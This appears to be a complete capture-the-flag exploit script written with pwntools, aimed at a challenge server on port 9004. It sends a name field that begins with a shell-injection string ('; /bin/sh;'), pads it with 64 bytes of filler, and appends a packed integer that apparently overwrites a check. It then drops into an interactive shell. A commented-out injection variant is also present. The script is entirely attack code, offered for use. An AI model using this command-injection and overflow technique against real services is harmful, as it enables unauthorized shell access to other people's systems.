from pwn import  *


HOST =  "hack.bckdr.in" 
PORT =  9004 



s = remote(HOST, PORT)

#namebuf = "'; ls'; |" 
namebuf =  "'; /bin/sh;'"  
namebuf += "\x41"*(64-len(namebuf))
namebuf += p32(0x00000000)
s.recvuntil( "Choice:" )
s.sendline("2")
s.recvuntil( "name:" )
s.sendline(namebuf)

s.recv(1024)
s.interactive()